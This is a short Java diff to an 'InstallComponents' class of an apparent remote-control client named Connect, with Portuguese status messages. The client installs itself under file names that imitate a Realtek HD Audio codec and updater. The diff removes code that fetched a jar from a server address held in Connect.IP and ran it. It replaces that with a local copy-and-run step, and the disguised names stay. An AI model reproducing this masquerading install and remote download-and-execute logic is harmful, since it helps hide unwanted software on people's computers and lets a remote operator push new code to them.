@@ -15,7 +15,6 @@ import java.util.UUID;
 public class InstallComponents {
 
     // Updater Variables
-    public static final String REMOTE_FILE = "http://" + Connect.IP + "/Connect.jar";
     public static final String LOCAL_FILE = "Realtek HD Audio Codec.jar";
     public static final String LOCAL_UPDATER = "Realtek HD Audio Updater.jar";
     public static final String LOCAL_SHORTCUT = "Realtek HD Audio Codec.lnk";
@@ -120,42 +119,23 @@ public class InstallComponents {
     }
 
     public static void verifyUpdate() {
-        long remoteSize = getRemoteFileSize(REMOTE_FILE);
+        long localUpdaterSize = getLocalFileSize(LOCAL_UPDATER);
         long localSize = getLocalFileSize(LOCAL_FILE);
         if (localSize == -1) {
             ConnectClient.msg("Versão temporária fora da pasta sendo executada!");
             return;
         }
-        if (remoteSize != localSize) {
-            ConnectClient.msg("Baixando última versão do Connect...");
-            if (FileComponents.downloadFile(REMOTE_FILE, new File(LOCAL_UPDATER))) {
-                runJar(LOCAL_UPDATER, null);
-            }
+        if (localUpdaterSize != localSize) {
+            ConnectClient.msg("Reiniciando com versão atualizada do Connect!");
+            runJar(LOCAL_UPDATER, null);
         } else {
             ConnectClient.msg("Última versão do connect sendo executada!");
         }
     }
 
     public static void update() {
-        if (FileComponents.downloadFile(REMOTE_FILE, new File(LOCAL_FILE))) {
-            runJar(LOCAL_FILE, null);
-        }
-    }
-
-    public static long getRemoteFileSize(String urlString) {
-        try {
-            URL url = new URL(urlString);
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("HEAD");
-            conn.connect();
-            if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
-                return conn.getContentLengthLong();
-            }
-        } catch (Exception exception) {
-            ConnectClient.msg("Ocorreu um erro ao pegar o tamanho do arquivo remoto! (" + exception.getMessage() + ")");
-            ConnectClient.exception(exception);
-        }
-        return -1;
+        FileComponents.copy(new File(LOCAL_UPDATER), new File(LOCAL_FILE));
+        runJar(LOCAL_FILE, null);
     }
 
     public static long getLocalFileSize(String localFileName) {
